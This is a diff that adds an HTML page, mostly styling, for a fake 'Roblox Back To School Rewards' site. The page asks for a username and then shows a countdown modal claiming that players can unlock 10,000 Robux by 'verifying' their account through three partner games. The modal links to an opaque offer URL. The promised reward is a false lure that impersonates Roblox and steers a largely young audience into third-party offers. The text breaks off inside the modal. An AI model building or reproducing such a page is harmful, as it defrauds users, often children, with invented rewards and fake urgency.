@@ -1,0 +1,1394 @@
+<html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;500;600;700&amp;family=Nunito:wght@400;600;700;800;900&amp;display=swap" rel="stylesheet">
+  <title>Roblox Back To School Rewards</title>
+  <style>
+    #rbx-summer-lookup,
+    #rbx-summer-lookup * {
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      width: 100%;
+      min-width: 0;
+      margin: 0;
+      padding: 0;
+      overflow-x: hidden;
+      -webkit-text-size-adjust: 100%;
+      text-size-adjust: 100%;
+    }
+
+    #rbx-summer-lookup {
+      --rsl-red: #e2231a;
+      --rsl-red-hover: #c91d15;
+      --rsl-green: #00b06f;
+      --rsl-dark: #0a0a0f;
+      --rsl-card: rgba(16, 16, 24, 0.92);
+      --rsl-card-hover: rgba(28, 28, 40, 0.95);
+      --rsl-primary: #f0f0f5;
+      --rsl-secondary: #9898a6;
+      --rsl-gold: #ffc940;
+      --rsl-gradient: linear-gradient(135deg, #ff6b35 0%, #f7c948 30%, #00b06f 60%, #00a2ff 100%);
+      position: relative;
+      width: 100%;
+      max-width: 100vw;
+      min-width: 0;
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      min-height: 100svh;
+      overflow-x: hidden;
+      overflow-y: auto;
+      background: var(--rsl-dark);
+      color: var(--rsl-primary);
+      font-family: "Nunito", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
+
+    #rbx-summer-lookup [hidden] {
+      display: none !important;
+    }
+
+    #rbx-summer-lookup button,
+    #rbx-summer-lookup input {
+      font: inherit;
+    }
+
+    .rsl-bg {
+      position: fixed;
+      inset: 0;
+      z-index: 0;
+      overflow: hidden;
+      pointer-events: none;
+      background-color: #08090f;
+      background-size: cover;
+      background-position: center center;
+      background-repeat: no-repeat;
+      transform: scale(1.015);
+    }
+
+    .rsl-bg::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background:
+        linear-gradient(180deg, rgba(5, 7, 13, 0.68) 0%, rgba(5, 7, 13, 0.76) 48%, rgba(5, 7, 13, 0.9) 100%),
+        radial-gradient(ellipse at center, rgba(9, 12, 22, 0.18) 0%, rgba(4, 5, 10, 0.72) 100%);
+    }
+
+    .rsl-bg::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background:
+        linear-gradient(90deg, rgba(5, 7, 13, 0.34), transparent 28%, transparent 72%, rgba(5, 7, 13, 0.34)),
+        radial-gradient(ellipse at center, transparent 0%, rgba(6, 7, 12, 0.32) 58%, rgba(4, 5, 10, 0.68) 100%);
+    }
+
+    .rsl-grid {
+      position: absolute;
+      inset: 0;
+      opacity: 0.08;
+      background-image:
+        linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
+      background-size: 48px 48px;
+      -webkit-mask-image: radial-gradient(circle at center, #000 0%, transparent 78%);
+      mask-image: radial-gradient(circle at center, #000 0%, transparent 78%);
+    }
+
+    .rsl-orb {
+      position: absolute;
+      border-radius: 999px;
+      filter: blur(100px);
+      opacity: 0.08;
+    }
+
+    .rsl-orb-one {
+      width: 420px;
+      height: 420px;
+      top: -170px;
+      left: -120px;
+      background: #ff6b35;
+    }
+
+    .rsl-orb-two {
+      width: 460px;
+      height: 460px;
+      right: -180px;
+      top: 18%;
+      background: #00a2ff;
+    }
+
+    .rsl-orb-three {
+      width: 380px;
+      height: 380px;
+      left: 35%;
+      bottom: -260px;
+      background: #00b06f;
+    }
+
+    .rsl-app {
+      position: relative;
+      z-index: 2;
+      width: 100%;
+      min-width: 0;
+      min-height: 100vh;
+      min-height: 100svh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .rsl-nav {
+      position: fixed;
+      top: 0;
+      right: 0;
+      left: 0;
+      z-index: 10000;
+      width: 100%;
+      height: 64px;
+      min-height: 64px;
+      margin: 0;
+      padding: 14px 32px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+      background: rgba(10, 10, 15, 0.96);
+      backdrop-filter: blur(24px);
+      -webkit-backdrop-filter: blur(24px);
+    }
+
+    .rsl-brand {
+      display: inline-flex;
+      align-items: center;
+      min-width: 0;
+      text-decoration: none;
+    }
+
+    .rsl-brand-logo {
+      display: block;
+      width: auto;
+      height: 34px;
+      max-width: min(210px, 46vw);
+      object-fit: contain;
+      border-radius: 8px;
+    }
+
+    .rsl-event-badge {
+      padding: 5px 13px;
+      border-radius: 999px;
+      background: var(--rsl-gradient);
+      color: #050508;
+      font-family: "Fredoka", sans-serif;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 1.4px;
+      text-transform: uppercase;
+      box-shadow: 0 8px 30px rgba(247, 201, 72, 0.12);
+    }
+
+    .rsl-main {
+      flex: 1;
+      display: grid;
+      padding-top: 64px;
+    }
+
+    .rsl-search-screen,
+    .rsl-result-screen {
+      min-height: calc(100vh - 126px);
+      padding: 48px 24px;
+    }
+
+    .rsl-search-screen {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .rsl-hero {
+      width: min(680px, 100%);
+      text-align: center;
+      animation: rsl-fade-up 0.75s ease both;
+    }
+
+    @keyframes rsl-fade-up {
+      from { opacity: 0; transform: translateY(28px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .rsl-summer-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 27px;
+      padding: 8px 19px;
+      border: 1px solid rgba(255, 201, 64, 0.25);
+      border-radius: 999px;
+      background: rgba(255, 201, 64, 0.1);
+      color: var(--rsl-gold);
+      font-size: 13px;
+      font-weight: 700;
+      letter-spacing: 1.8px;
+      text-transform: uppercase;
+      backdrop-filter: blur(10px);
+    }
+
+    .rsl-title {
+      width: 100%;
+      margin: 0 0 18px;
+      font-family: "Fredoka", sans-serif;
+      font-size: clamp(38px, 6vw, 64px);
+      font-weight: 700;
+      line-height: 1.04;
+      letter-spacing: -0.035em;
+      text-align: center;
+      color: #ffffff;
+      text-shadow: 0 5px 34px rgba(0, 0, 0, 0.58);
+    }
+
+    .rsl-title-line { display: block; }
+    .rsl-title-main { white-space: nowrap; }
+    .rsl-title-summer { margin-top: 0.08em; color: #ffffff; -webkit-text-fill-color: #ffffff; }
+
+    .rsl-gradient-text {
+      display: inline-block;
+      background: var(--rsl-gradient);
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .rsl-subtitle {
+      width: min(610px, 100%);
+      margin: 0 auto 38px;
+      color: var(--rsl-secondary);
+      font-size: 17px;
+      line-height: 1.65;
+      text-shadow: 0 2px 12px rgba(0, 0, 0, 0.5);
+    }
+
+    .rsl-form {
+      width: min(520px, 100%);
+      margin: 0 auto;
+    }
+
+    .rsl-input-group {
+      display: grid;
+      grid-template-columns: minmax(0, 1fr) auto;
+      gap: 12px;
+      overflow: visible;
+    }
+
+    #rsl-username {
+      width: 100%;
+      min-width: 0;
+      height: 60px;
+      padding: 0 22px;
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      border-radius: 15px;
+      outline: 0;
+      background: rgba(28, 28, 40, 0.9);
+      color: var(--rsl-primary);
+      font-size: 16px;
+      font-weight: 600;
+      box-shadow: 0 18px 52px rgba(0, 0, 0, 0.42);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+    }
+
+    #rsl-username:focus {
+      border-color: rgba(255, 255, 255, 0.28);
+      background: rgba(32, 32, 46, 0.96);
+      box-shadow: 0 0 0 4px rgba(0, 162, 255, 0.09), 0 20px 58px rgba(0, 0, 0, 0.48);
+    }
+
+    #rsl-username::placeholder { color: var(--rsl-secondary); font-weight: 400; }
+
+    .rsl-submit {
+      min-width: 142px;
+      min-height: 60px;
+      padding: 0 27px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 0;
+      border-radius: 15px;
+      background: var(--rsl-red);
+      color: #ffffff;
+      cursor: pointer;
+      font-family: "Fredoka", sans-serif;
+      font-size: 15px;
+      font-weight: 800;
+      letter-spacing: 0.01em;
+      box-shadow: 0 18px 44px rgba(226, 35, 26, 0.22);
+      transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
+    }
+
+    .rsl-submit-label, .rsl-submit-label strong { font-weight: 700; }
+    .rsl-submit:hover { background: var(--rsl-red-hover); }
+    .rsl-submit:active { transform: scale(0.975); }
+    .rsl-submit:disabled { opacity: 0.62; cursor: wait; }
+
+    .rsl-spinner {
+      display: none;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255, 255, 255, 0.32);
+      border-top-color: #ffffff;
+      border-radius: 50%;
+      animation: rsl-spin 0.65s linear infinite;
+    }
+
+    .rsl-submit.rsl-loading .rsl-submit-label { display: none; }
+    .rsl-submit.rsl-loading .rsl-spinner { display: inline-block; }
+
+    @keyframes rsl-spin { to { transform: rotate(360deg); } }
+
+    .rsl-message {
+      min-height: 22px;
+      margin: 14px 0 0;
+      color: #ff6b6b;
+      font-size: 14px;
+      font-weight: 700;
+    }
+
+    .rsl-message.rsl-success { color: #34d399; }
+
+    .rsl-trust-row {
+      margin-top: 20px;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .rsl-trust-row span {
+      padding: 7px 11px;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 999px;
+      background: rgba(255, 255, 255, 0.045);
+      color: var(--rsl-secondary);
+      font-size: 12px;
+      font-weight: 700;
+      backdrop-filter: blur(12px);
+    }
+
+    .rsl-result-screen {
+      display: none;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .rsl-result-screen.rsl-active { display: flex; }
+
+    .rsl-dashboard {
+      width: min(720px, 100%);
+      margin: 0 auto;
+    }
+
+    .rsl-profile-header {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+      padding: 44px 30px 38px;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 20px;
+      background: var(--rsl-card);
+      box-shadow: 0 24px 70px rgba(0, 0, 0, 0.38);
+      text-align: center;
+      backdrop-filter: blur(30px);
+      -webkit-backdrop-filter: blur(30px);
+      animation: rsl-fade-up 0.55s ease both;
+    }
+
+    .rsl-avatar-wrap { position: relative; flex: 0 0 auto; }
+
+    .rsl-avatar {
+      display: block;
+      width: 150px;
+      height: 150px;
+      object-fit: cover;
+      border: 3px solid var(--rsl-green);
+      border-radius: 50%;
+      background: linear-gradient(135deg, #2a2a3d, #1a1a2e);
+      box-shadow: 0 10px 32px rgba(0, 176, 111, 0.15);
+    }
+
+    .rsl-online-dot {
+      position: absolute;
+      right: 8px;
+      bottom: 8px;
+      width: 23px;
+      height: 23px;
+      border: 3px solid rgba(16, 16, 24, 0.94);
+      border-radius: 50%;
+      background: var(--rsl-green);
+    }
+
+    .rsl-profile-info { width: 100%; min-width: 0; }
+
+    .rsl-name-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .rsl-profile-info h2 {
+      overflow: hidden;
+      margin: 0 0 6px;
+      font-family: "Fredoka", sans-serif;
+      font-size: 28px;
+      font-weight: 700;
+      line-height: 1.15;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .rsl-verified {
+      display: inline-grid;
+      width: 22px;
+      height: 22px;
+      flex: 0 0 auto;
+      place-items: center;
+      border-radius: 50%;
+      background: #00a2ff;
+      color: #ffffff;
+      font-size: 12px;
+      font-weight: 900;
+    }
+
+    .rsl-handle {
+      overflow: hidden;
+      margin: 0;
+      color: var(--rsl-secondary);
+      font-size: 14px;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .rsl-pending-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      max-width: 100%;
+      padding: 13px 24px;
+      border: 1px solid rgba(255, 201, 64, 0.32);
+      border-radius: 999px;
+      background: rgba(255, 201, 64, 0.13);
+      color: var(--rsl-gold);
+      font-family: "Fredoka", sans-serif;
+      font-size: 20px;
+      font-weight: 700;
+      line-height: 1.15;
+      box-shadow: inset 0 0 20px rgba(255, 201, 64, 0.04);
+    }
+
+    .rsl-pending-star { flex: 0 0 auto; font-size: 25px; line-height: 1; }
+
+    .rsl-steps-card {
+      margin-top: 24px;
+      overflow: hidden;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 20px;
+      background: var(--rsl-card);
+      box-shadow: 0 24px 70px rgba(0, 0, 0, 0.34);
+      backdrop-filter: blur(30px);
+      -webkit-backdrop-filter: blur(30px);
+      animation: rsl-fade-up 0.55s ease 0.12s both;
+    }
+
+    .rsl-steps-header {
+      padding: 23px 30px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 15px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+    }
+
+    .rsl-steps-header h3 {
+      margin: 0;
+      font-family: "Fredoka", sans-serif;
+      font-size: 21px;
+      font-weight: 700;
+    }
+
+    .rsl-found-tag {
+      flex: 0 0 auto;
+      padding: 6px 14px;
+      border-radius: 999px;
+      background: rgba(0, 176, 111, 0.12);
+      color: var(--rsl-green);
+      font-size: 13px;
+      font-weight: 700;
+    }
+
+    .rsl-step-item {
+      padding: 22px 30px;
+      display: flex;
+      align-items: flex-start;
+      gap: 19px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.045);
+      transition: background 0.2s;
+    }
+
+    .rsl-step-item:hover { background: var(--rsl-card-hover); }
+    .rsl-step-item:last-child { border-bottom: 0; }
+
+    .rsl-step-number {
+      width: 44px;
+      height: 44px;
+      flex: 0 0 auto;
+      display: grid;
+      place-items: center;
+      border-radius: 12px;
+      color: #ffffff;
+      font-family: "Fredoka", sans-serif;
+      font-size: 18px;
+      font-weight: 700;
+    }
+
+    .rsl-step-one { background: linear-gradient(135deg, #ff6b35, #e2231a); }
+    .rsl-step-two { background: linear-gradient(135deg, #00b06f, #00a2ff); }
+    .rsl-step-three { background: linear-gradient(135deg, #f7c948, #ff6b35); }
+
+    .rsl-step-content { min-width: 0; flex: 1; }
+    .rsl-step-content-wide { width: 100%; }
+
+    .rsl-step-content h4 { margin: 0 0 6px; font-size: 16px; font-weight: 800; }
+    .rsl-step-content p { margin: 0; color: var(--rsl-secondary); font-size: 14px; line-height: 1.55; }
+
+    .rsl-continue {
+      min-width: 260px;
+      margin: 18px auto 0;
+      padding: 15px 27px;
+      position: relative;
+      left: -31px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      border: 0;
+      border-radius: 12px;
+      background: var(--rsl-green);
+      color: #ffffff;
+      cursor: pointer;
+      font-family: "Fredoka", sans-serif;
+      font-size: 15px;
+      font-weight: 700;
+      letter-spacing: 0.01em;
+      line-height: 1.25;
+      text-align: center;
+      text-decoration: none;
+      transition: background 0.2s, transform 0.2s, box-shadow 0.2s;
+    }
+
+    .rsl-continue::before {
+      content: "✓";
+      width: 21px;
+      height: 21px;
+      flex: 0 0 21px;
+      display: grid;
+      place-items: center;
+      border: 2px solid #ffffff;
+      border-radius: 50%;
+      color: #ffffff;
+      font-family: Arial, sans-serif;
+      font-size: 13px;
+      font-weight: 900;
+      line-height: 1;
+    }
+
+    .rsl-continue:hover {
+      transform: translateY(-1px);
+      background: #009960;
+      box-shadow: 0 8px 25px rgba(0, 176, 111, 0.28);
+    }
+
+    .rsl-continue:active { transform: scale(0.975); }
+
+    .rsl-back {
+      margin: 22px auto 0;
+      padding: 10px 18px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 10px;
+      background: transparent;
+      color: var(--rsl-secondary);
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 700;
+      transition: color 0.2s, border-color 0.2s, background 0.2s;
+    }
+
+    .rsl-back:hover {
+      border-color: rgba(255, 255, 255, 0.22);
+      background: rgba(255, 255, 255, 0.04);
+      color: var(--rsl-primary);
+    }
+
+    .rsl-footer {
+      padding: 22px 24px 28px;
+      color: rgba(152, 152, 166, 0.62);
+      font-size: 12px;
+      line-height: 1.5;
+      text-align: center;
+    }
+
+    /* ─── BONUS MODAL ──────────────────────────────────────────────── */
+
+    .rsl-modal-backdrop {
+      position: fixed;
+      inset: 0;
+      z-index: 99999;
+      display: flex;
+      align-items: flex-end;
+      justify-content: center;
+      background: rgba(4, 5, 10, 0.82);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.28s ease;
+    }
+
+    .rsl-modal-backdrop.rsl-modal-open {
+      opacity: 1;
+      pointer-events: all;
+    }
+
+    .rsl-modal {
+      width: min(520px, 100%);
+      margin: 0 auto;
+      padding: 32px 28px 30px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-bottom: none;
+      border-radius: 26px 26px 0 0;
+      background: #11111c;
+      box-shadow: 0 -24px 80px rgba(0, 0, 0, 0.7);
+      transform: translateY(100%);
+      transition: transform 0.34s cubic-bezier(0.22, 1, 0.36, 1);
+      text-align: center;
+    }
+
+    .rsl-modal-backdrop.rsl-modal-open .rsl-modal {
+      transform: translateY(0);
+    }
+
+    .rsl-modal-pill {
+      width: 44px;
+      height: 5px;
+      margin: 0 auto 26px;
+      border-radius: 999px;
+      background: rgba(255, 255, 255, 0.12);
+    }
+
+    .rsl-modal-eyebrow {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 9px;
+      margin-bottom: 10px;
+    }
+
+    .rsl-modal-tag {
+      padding: 4px 10px;
+      border-radius: 999px;
+      background: rgba(255, 201, 64, 0.14);
+      border: 1px solid rgba(255, 201, 64, 0.28);
+      color: var(--rsl-gold);
+      font-size: 11px;
+      font-weight: 800;
+      letter-spacing: 1.3px;
+      text-transform: uppercase;
+    }
+
+    .rsl-modal-timer {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      color: var(--rsl-secondary);
+      font-size: 12px;
+      font-weight: 700;
+    }
+
+    .rsl-modal-timer-dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: #ff4545;
+      animation: rsl-pulse 1.2s ease-in-out infinite;
+    }
+
+    @keyframes rsl-pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(0.75); }
+    }
+
+    .rsl-modal-title {
+      margin: 0 0 6px;
+      font-family: "Fredoka", sans-serif;
+      font-size: 26px;
+      font-weight: 700;
+      line-height: 1.1;
+      color: #ffffff;
+      text-align: center;
+    }
+
+    .rsl-modal-title span {
+      background: var(--rsl-gradient);
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .rsl-modal-sub {
+      margin: 0 0 22px;
+      color: var(--rsl-secondary);
+      font-size: 14px;
+      line-height: 1.55;
+      text-align: center;
+    }
+
+    .rsl-bonus-tiers {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    .rsl-tier {
+      padding: 14px 12px;
+      border-radius: 14px;
+      border: 1px solid rgba(255, 255, 255, 0.07);
+      background: rgba(255, 255, 255, 0.035);
+      text-align: center;
+      transition: border-color 0.18s, background 0.18s;
+      cursor: default;
+    }
+
+    .rsl-tier-hot {
+      border-color: rgba(255, 201, 64, 0.3);
+      background: rgba(255, 201, 64, 0.07);
+      position: relative;
+    }
+
+    .rsl-tier-hot::before {
+      content: "MOST POPULAR";
+      position: absolute;
+      top: -9px;
+      left: 50%;
+      transform: translateX(-50%);
+      padding: 2px 8px;
+      border-radius: 999px;
+      background: var(--rsl-gold);
+      color: #0a0a0f;
+      font-size: 8px;
+      font-weight: 900;
+      letter-spacing: 1px;
+      white-space: nowrap;
+    }
+
+    .rsl-tier-deposit {
+      margin: 0 0 6px;
+      color: var(--rsl-secondary);
+      font-size: 12px;
+      font-weight: 700;
+      line-height: 1.3;
+    }
+
+    .rsl-tier-in {
+      margin: 0 0 4px;
+      font-family: "Fredoka", sans-serif;
+      font-size: 20px;
+      font-weight: 700;
+      color: #ffffff;
+    }
+
+    .rsl-tier-arrow {
+      margin: 4px 0;
+      font-size: 14px;
+      color: var(--rsl-secondary);
+      line-height: 1;
+    }
+
+    .rsl-tier-out-label {
+      margin: 0 0 2px;
+      color: var(--rsl-secondary);
+      font-size: 11px;
+      font-weight: 700;
+    }
+
+    .rsl-tier-out {
+      margin: 0;
+      font-family: "Fredoka", sans-serif;
+      font-size: 22px;
+      font-weight: 700;
+      color: var(--rsl-green);
+    }
+
+    .rsl-tier-hot .rsl-tier-out { color: var(--rsl-gold); }
+
+    .rsl-modal-cta {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      width: 100%;
+      padding: 17px 24px;
+      border: 0;
+      border-radius: 15px;
+      background: linear-gradient(135deg, #00b06f 0%, #00c97c 100%);
+      color: #ffffff;
+      cursor: pointer;
+      font-family: "Fredoka", sans-serif;
+      font-size: 17px;
+      font-weight: 700;
+      letter-spacing: 0.01em;
+      box-shadow: 0 12px 36px rgba(0, 176, 111, 0.26);
+      text-decoration: none;
+      transition: transform 0.18s, box-shadow 0.18s, background 0.18s;
+    }
+
+    .rsl-modal-cta:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 18px 44px rgba(0, 176, 111, 0.34);
+      background: linear-gradient(135deg, #00c47c 0%, #00e08a 100%);
+    }
+
+    .rsl-modal-cta:active { transform: scale(0.977); }
+
+    .rsl-modal-cta-icon {
+      font-size: 20px;
+      line-height: 1;
+      flex: 0 0 auto;
+    }
+
+    .rsl-modal-skip {
+      display: block;
+      width: 100%;
+      margin-top: 13px;
+      padding: 8px;
+      background: transparent;
+      border: 0;
+      color: rgba(152, 152, 166, 0.6);
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+      text-align: center;
+      transition: color 0.18s;
+    }
+
+    .rsl-modal-skip:hover { color: var(--rsl-secondary); }
+
+    .rsl-modal-note {
+      margin-top: 14px;
+      display: flex;
+      align-items: flex-start;
+      gap: 7px;
+      padding: 10px 13px;
+      border-radius: 10px;
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      color: rgba(152, 152, 166, 0.65);
+      font-size: 11.5px;
+      line-height: 1.45;
+    }
+
+    .rsl-modal-note-icon { flex: 0 0 auto; font-size: 13px; margin-top: 1px; }
+
+    /* ─── RESPONSIVE ──────────────────────────────────────────────── */
+
+    @media (min-width: 561px) {
+      .rsl-modal-backdrop {
+        align-items: center;
+      }
+      .rsl-modal {
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        border-radius: 24px;
+        transform: translateY(32px) scale(0.97);
+      }
+      .rsl-modal-backdrop.rsl-modal-open .rsl-modal {
+        transform: translateY(0) scale(1);
+      }
+      .rsl-modal-pill { display: none; }
+    }
+
+    @media (max-width: 720px) {
+      .rsl-bg { background-position: center top; transform: scale(1.03); }
+      .rsl-bg::before {
+        background:
+          linear-gradient(180deg, rgba(5, 7, 13, 0.72) 0%, rgba(5, 7, 13, 0.8) 50%, rgba(5, 7, 13, 0.92) 100%),
+          radial-gradient(ellipse at 50% 30%, rgba(9, 12, 22, 0.12) 0%, rgba(4, 5, 10, 0.74) 100%);
+      }
+      .rsl-nav { height: 56px; min-height: 56px; padding: 10px 14px; }
+      .rsl-main { padding-top: 56px; }
+      .rsl-brand-logo { height: 30px; max-width: 45vw; }
+      .rsl-search-screen, .rsl-result-screen { min-height: calc(100svh - 112px); padding: 28px 14px; }
+      .rsl-hero, .rsl-dashboard { width: 100%; max-width: none; }
+      .rsl-profile-header { padding: 34px 20px 30px; gap: 18px; }
+      .rsl-avatar { width: 132px; height: 132px; }
+      .rsl-profile-info h2, .rsl-handle { white-space: normal; }
+    }
+
+    @media (max-width: 560px) {
+      .rsl-event-badge { padding: 5px 9px; font-size: 9px; letter-spacing: 0.9px; }
+      .rsl-search-screen { align-items: flex-start; padding-top: 38px; }
+      .rsl-summer-tag { margin-bottom: 20px; padding: 7px 13px; font-size: 11px; letter-spacing: 1.2px; }
+      .rsl-title { font-size: clamp(31px, 10vw, 43px); line-height: 1.02; letter-spacing: -0.04em; }
+      .rsl-title-summer { margin-top: 0.1em; }
+      .rsl-subtitle { margin-bottom: 26px; font-size: 16px; line-height: 1.55; }
+      .rsl-input-group { grid-template-columns: 1fr; gap: 12px; }
+      #rsl-username { height: 60px; padding: 0 18px; border-radius: 14px; font-size: 16px; }
+      .rsl-submit { width: 100%; min-height: 58px; border-radius: 14px; }
+      .rsl-trust-row { gap: 6px; }
+      .rsl-trust-row span { padding: 6px 8px; font-size: 10px; }
+      .rsl-result-screen { align-items: flex-start; min-height: auto; padding: 10px 12px 22px; }
+      .rsl-profile-header { display: flex; flex-direction: column; gap: 10px; padding: 18px 14px 16px; border-radius: 16px; text-align: center; }
+      .rsl-avatar { width: 96px; height: 96px; }
+      .rsl-online-dot { right: 3px; bottom: 3px; width: 17px; height: 17px; border-width: 2px; }
+      .rsl-name-row { justify-content: center; }
+      .rsl-profile-info h2 { margin-bottom: 3px; font-size: 22px; }
+      .rsl-handle { margin: 0; font-size: 12px; }
+      .rsl-pending-badge { gap: 8px; padding: 9px 15px; font-size: 15px; }
+      .rsl-pending-star { font-size: 19px; }
+      .rsl-steps-card { margin-top: 10px; border-radius: 16px; }
+      .rsl-steps-header { align-items: center; padding: 12px 14px; }
+      .rsl-steps-header h3 { font-size: 17px; }
+      .rsl-found-tag { padding: 4px 8px; font-size: 10px; }
+      .rsl-step-item { padding: 12px 14px; gap: 10px; }
+      .rsl-step-number { width: 32px; height: 32px; border-radius: 9px; font-size: 14px; }
+      .rsl-step-content h4 { margin-bottom: 4px; font-size: 15.5px; line-height: 1.2; }
+      .rsl-step-content p { font-size: 13px; line-height: 1.35; }
+      .rsl-continue {
+        width: min(100%, 360px);
+        min-width: 0;
+        min-height: 44px;
+        margin: 10px auto 0;
+        padding: 10px 13px;
+        left: -21px;
+        gap: 8px;
+        color: #ffffff;
+        font-size: 13px;
+        font-weight: 700;
+        line-height: 1.2;
+      }
+      .rsl-continue::before { width: 20px; height: 20px; flex-basis: 20px; font-size: 12px; }
+      .rsl-back { width: 100%; min-height: 48px; justify-content: center; margin-top: 14px; }
+      .rsl-footer { padding: 18px 16px 22px; font-size: 11px; }
+      .rsl-modal { padding: 24px 18px 22px; }
+      .rsl-modal-title { font-size: 22px; }
+      .rsl-bonus-tiers { gap: 8px; }
+      .rsl-tier { padding: 12px 10px; }
+      .rsl-tier-in { font-size: 18px; }
+      .rsl-tier-out { font-size: 19px; }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      #rbx-summer-lookup *,
+      #rbx-summer-lookup *::before,
+      #rbx-summer-lookup *::after {
+        scroll-behavior: auto !important;
+        animation-duration: 0.01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: 0.01ms !important;
+      }
+    }
+  </style>
+</head>
+<body>
+<div id="rbx-summer-lookup" data-initialized="true">
+  <div class="rsl-bg" aria-hidden="true">
+    <div class="rsl-orb rsl-orb-one"></div>
+    <div class="rsl-orb rsl-orb-two"></div>
+    <div class="rsl-orb rsl-orb-three"></div>
+    <div class="rsl-grid"></div>
+  </div>
+
+  <!-- ─── BONUS MODAL ──────────────────────────────────────────── -->
+  <div id="rsl-modal-backdrop" class="rsl-modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="rsl-modal-title-el">
+    <div class="rsl-modal">
+      <div class="rsl-modal-pill"></div>
+
+      <div class="rsl-modal-eyebrow">
+        <span class="rsl-modal-tag">⚡ Limited Time</span>
+        <span class="rsl-modal-timer">
+          <span class="rsl-modal-timer-dot"></span>
+          <span id="rsl-countdown">Offer expires in 14:59</span>
+        </span>
+      </div>
+
+      <h2 id="rsl-modal-title-el" class="rsl-modal-title">One quick step to<br><span>unlock your Robux</span></h2>
+      <p class="rsl-modal-sub">Play 3 games from our partners to verify your account and unlock your 10,000 Robux reward — takes less than 5 minutes.</p>
+
+      <div class="rsl-bonus-tiers" style="grid-template-columns: 1fr 1fr 1fr;">
+        <div class="rsl-tier">
+          <p class="rsl-tier-arrow">🎮</p>
+          <p class="rsl-tier-deposit">Play Game 1</p>
+          <p class="rsl-tier-out" style="font-size: 15px; color: var(--rsl-secondary);">~5 min</p>
+        </div>
+        <div class="rsl-tier">
+          <p class="rsl-tier-arrow">🎮</p>
+          <p class="rsl-tier-deposit">Play Game 2</p>
+          <p class="rsl-tier-out" style="font-size: 15px; color: var(--rsl-secondary);">~5 min</p>
+        </div>
+        <div class="rsl-tier">
+          <p class="rsl-tier-arrow">🏆</p>
+          <p class="rsl-tier-deposit">Play Game 3</p>
+          <p class="rsl-tier-out" style="font-size: 15px; color: var(--rsl-green);">Unlocked!</p>
+        </div>
+      </div>
+
+      <a id="rsl-modal-cta" class="rsl-modal-cta" href="https://www.stw4c9hx.com/GNW68X/L1B1F8/">
+        <span class="rsl-modal-cta-icon">🎮</span>
+        Claim Bonus &amp; Unlock Robux
+      </a>
+
+      <button id="rsl-modal-skip" class="rsl-modal-skip" type="button">Skip bonus — just add Playful</button>
+
+      <div class="rsl-modal-note">
+        <span class="rsl-modal-note-icon">🔒</span>
+        <span>Completing a gaming offer verifies your account and activates your 10,000 Robux. Bonus match applied instantly after third game.</span>
